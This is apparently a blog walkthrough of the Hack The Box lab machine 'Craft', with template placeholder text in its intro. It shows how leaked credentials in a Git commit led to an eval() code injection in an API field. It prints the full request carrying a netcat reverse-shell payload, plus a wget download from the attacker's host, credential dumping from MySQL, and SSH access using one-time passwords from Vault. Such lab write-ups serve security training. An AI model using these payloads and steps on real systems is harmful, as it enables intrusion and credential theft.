---
layout: single
title: Craft - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2019-10-13
classes: wide
header:
  teaser: /assets/images/htb-writeup-craft/craft_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-craft/craft_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. nmap -Pn -sC -sV -n 10.10.10.110
    22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
    443/tcp open  ssl/http nginx 1.15.8
    6022/tcp open x11

2. Access HTTPS and look around, notice that gogs.craft.htb and api.craft.htb is not reachable (icons in top right corner of the page).
   Add the URLs in /etc/hosts:
    10.10.10.110  gogs.craft.htb api.craft.htb

3. Look around on gogs.craft.htb and you can find a test script by Dinesh, containing his username and password (dinesh:4aUh0A8PbVJxgd)
    https://gogs.craft.htb/Craft/craft-api/commit/10e3ba4f0a09c778d7cec673f28d410b73455a86

    Using these credentials we can get a token from the API (https://api.craft.htb/api/) or using curl.
      API: https://api.craft.htb/api/

      CURL: curl -k -u dinesh:4aUh0A8PbVJxgd https://api.craft.htb/api/auth/login
        {"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTcwNjA5ODM0fQ.WRjbAWd7WEpOhoL34hSlGmA92c2bCtYmboNKPG1Oie8"}

4. With the credentials and token, we now have a way to POST/PUT information onto the server, now we need to find a way to exploit this.
   Login as Dinesh on gogs.craft.htb, add your SSH-key and download the repository. Looking through the files we can find the Source Code for brew.py.
   Looking through brew.py we can find that they use a eval-function for input validation of 'abv', this makes it vulnerable for Code Injection.

   NOTE: You don't need to download the files, they can also be viewed directly on gogs.craft.htb, but I think it's easier to download

   # make sure the ABV value is sane.
   if eval('%s > 1' % request.json['abv']):
       return "ABV must be a decimal value less than 1.0", 400
   else:
       create_brew(request.json)
       return None, 201

5. Exploit the abv eval-function.
   Start netcat and send a POST through the API. Capture it in burp and edit the request by adding a valid token (created by Dinesh) and inject desired code in the abv-field.

      POST /api/brew/ HTTP/1.1
      Host: api.craft.htb
      User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
      Accept: application/json
      Accept-Language: en-US,en;q=0.5
      Accept-Encoding: gzip, deflate
      Referer: https://api.craft.htb/api/
      content-type: application/json
      origin: https://api.craft.htb
      Content-Length: 96
      Connection: close
      X-Craft-API-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTcxMTMzMDkwfQ.m2NfNIDs-bqUcuqRzYXITIQ5lWXHtENnijqLiIcMgMQ

      {
        "id": 2352,
        "brewer": "string",
        "name": "string",
        "style": "string",
        "abv": "__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.12 4488 >/tmp/f')"
      }

      root@p3:/opt/htb/machines/craft# nc -lvnp 4488
        listening on [any] 4488 ...
        connect to [10.10.14.12] from (UNKNOWN) [10.10.10.110] 42163
        /bin/sh: can't access tty; job control turned off
        /opt/app #

6. At first glance you are user root, but you can't access any flags, seems like we are in a docker and need to break out.
   Looking through the scripts and .gitignore there are a lot of references to settings.py, looking in that file we find a db user and password. (craft:qLGockJ6G2J75O)
   The script dbtest.py calls settings.py to get information from the database brew. In craft_api/api/database/models.py we can find a second database, User.
   Download dbtest.py and edit to call user database. Notice that we also need to change result from cursor.fetchone() to cursor.fetchall() to get all info within the database.

   root@p3:/opt/htb/machines/craft/craft-api# cat exp-db.py
     #!/usr/bin/env python

     import pymysql
     from craft_api import settings

     # test connection to mysql database

     connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                                  user=settings.MYSQL_DATABASE_USER,
                                  password=settings.MYSQL_DATABASE_PASSWORD,
                                  db=settings.MYSQL_DATABASE_DB,
                                  cursorclass=pymysql.cursors.DictCursor)

     try:
         with connection.cursor() as cursor:
             sql = "SELECT `id`, `username`, `password` FROM `user`"
             cursor.execute(sql)
             result = cursor.fetchall()
             print(result)

     finally:
         connection.close()

  root@p3:/opt/htb/machines/craft/craft-api# python3 -m http.server 8888

  /opt/app # wget http://10.10.14.12:8888/exp-db.py
    Connecting to 10.10.14.12:8888 (10.10.14.12:8888)
    exp-db.py            100% |********************************|   664  0:00:00 ETA

  /opt/app # chmod +x exp-db.py
  /opt/app # python exp-db.py
    [{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]

7. Gilfoyle reuses his credentials for gogs.craft.htb, login to his account and you'll find his public and private SSH-keys. Download the private key, give it chmod 600, and SSH with same creds again.

    root@p3:/opt/htb/machines/craft# ssh gilfoyle@10.10.10.110 -i id_rsa-gilf

      .   *   ..  . *  *
      *  * @()Ooc()*   o  .
      (Q@*0CG*O()  ___
      |\_________/|/ _ \
      |  |  |  |  | / | |
      |  |  |  |  | | | |
      |  |  |  |  | | | |
      |  |  |  |  | | | |
      |  |  |  |  | | | |
      |  |  |  |  | \_| |
      |  |  |  |  |\___/
      |\_|__|__|_/|
      \_________/

      Enter passphrase for key 'id_rsa-gilf':
      Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

      The programs included with the Debian GNU/Linux system are free software;
      the exact distribution terms for each program are described in the
      individual files in /usr/share/doc/*/copyright.

      Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
      permitted by applicable law.
      Last login: Mon Oct 14 07:18:13 2019 from 10.10.14.21
    gilfoyle@craft:~$

8. Grab user-flag.
    gilfoyle@craft:~$ cat /home/gilfoyle/user.txt
      bbf4****************************


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Login with Gilfoyle's creds on gogs.craft.htb, in the repo craft-infra you'll find a folder named vault and within it secrets.sh
    Vault is used to provide one-time passwords (OTP) for SSH login, I google'd 'vault ssh' and the first link I found explains how to request a OTP.
    https://learn.hashicorp.com/vault/secrets-management/sm-ssh-otp#step-3-request-an-otp

    In their example they write:
      vault write ssh/creds/otp_key_role ip=<REMOTE_HOST_IP>

    Trying this gives us an error: * Role "otp_key_role" not found
    Looking at secrets.sh we find that the 'vault write'-string ends with root_otp, lets try that instead:
      gilfoyle@craft:~$ vault write ssh/creds/root_otp ip=10.10.10.110
      Key                Value
      ---                -----
      lease_id           ssh/creds/root_otp/bdbe45d6-24b0-6a02-8534-d37bbb3f54c5
      lease_duration     768h
      lease_renewable    false
      ip                 10.10.10.110
      key                1762e6a1-f975-61f8-814e-f7d65a2a1f51
      key_type           otp
      port               22
      username           root

    NOTE: The key value is the OTP to use during SSH authentication.

2. SSH with the OTP-creds generated and grab root.txt.
    root@p3:/opt/htb/machines/craft# ssh root@10.10.10.110
    root@craft:~# cat root.txt
      831d****************************
